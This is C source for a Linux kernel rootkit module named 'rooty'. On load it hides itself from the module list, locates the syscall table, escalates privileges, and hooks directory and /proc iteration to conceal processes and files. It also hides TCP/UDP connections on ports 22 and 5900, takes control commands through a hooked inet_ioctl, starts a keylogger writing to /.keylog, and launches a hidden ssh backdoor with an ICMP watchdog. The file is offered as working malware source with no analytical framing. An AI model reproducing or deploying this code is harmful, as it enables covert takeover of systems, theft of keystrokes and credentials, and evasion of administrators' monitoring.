#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/unistd.h> 
#include <linux/mm_types.h>
#include <linux/types.h>  
#include <linux/dirent.h> 
#include <linux/sched.h>  
#include <linux/proc_fs.h>  
#include <linux/namei.h>  
#include <linux/seq_file.h> 
#include <net/tcp.h>      
#include <net/udp.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/socket.h>
#include <linux/signal.h>
#include <linux/kthread.h>
#include <linux/keyboard.h>

#include "syscall_table.h"
#include "proc_fs_hide.h"
#include "socket_hide.h"
#include "keymap.h"
#include "keylogger.h"
#include "ssh.h"
#include "ioctl.h"

MODULE_LICENSE("GPL");

int rooty_init(void);
void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);

int rooty_init(void)
{
    printk("rooty: Module loaded\n");
    // Do kernel module hiding
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    // Find the sys_call_table address in kernel memory
    if ((syscall_table = (unsigned long *) find_sys_call_table()))
    {
        printk("rooty: sys_call_table found at %p\n", syscall_table);
    }
    else
    {
        printk("rooty: sys_call_table not found, aborting\n");
        return 0;
    }

    // get root previlages
    root_me();

    // Hook /proc for hiding processes
    proc_iterate = get_vfs_iterate("/proc");
    hijack_start(proc_iterate, &n_proc_iterate);

    // Hook / for hiding files and directories
    root_iterate = get_vfs_iterate("/");
    hijack_start(root_iterate, &n_root_iterate);

    // init socket hiding
    // Hook /proc/net/tcp for hiding tcp4 connections
    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
    hijack_start(tcp4_seq_show, &n_tcp4_seq_show);

    // Hook /proc/net/tcp6 for hiding tcp6 connections
    tcp6_seq_show = get_tcp_seq_show("/proc/net/tcp6");
    hijack_start(tcp6_seq_show, &n_tcp6_seq_show);

    // Hook /proc/net/udp for hiding udp4 connections
    udp4_seq_show = get_udp_seq_show("/proc/net/udp");
    hijack_start(udp4_seq_show, &n_udp4_seq_show);

    // Hook /proc/net/udp6 for hiding udp4 connections
    udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
    hijack_start(udp6_seq_show, &n_udp6_seq_show);

    // Hook inet_ioctl() for rootkit control
    inet_ioctl = get_inet_ioctl(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    hijack_start(inet_ioctl, &n_inet_ioctl);

    // Init keylogger, store keylog in /.keylog 
    init_keylogger();

    // Init userspace ssh server with ICMP watchdog service 
    init_ssh();
    
	// hide rootkit files
    hide_file("sshd");
    hide_file("vncd");
    hide_file("rooty.ko");
    hide_file("ioctl");

	// hide sshd ports
    hide_tcp4_port(22);
    hide_udp4_port(22);
    
	//hide vncd ports
    hide_tcp4_port(5900);
    hide_udp4_port(5900);
    hide_tcp6_port(5900);
    hide_udp6_port(5900);

    return 0;
}

void rooty_exit(void)
{
    stop_ssh();
    stop_keylogger();
    hijack_stop(inet_ioctl);
    hijack_stop(udp6_seq_show);
    hijack_stop(udp4_seq_show);
    hijack_stop(tcp6_seq_show);
    hijack_stop(tcp4_seq_show);
    hijack_stop(root_iterate);
    hijack_stop(proc_iterate);
    printk("rooty: Module unloaded\n");
}
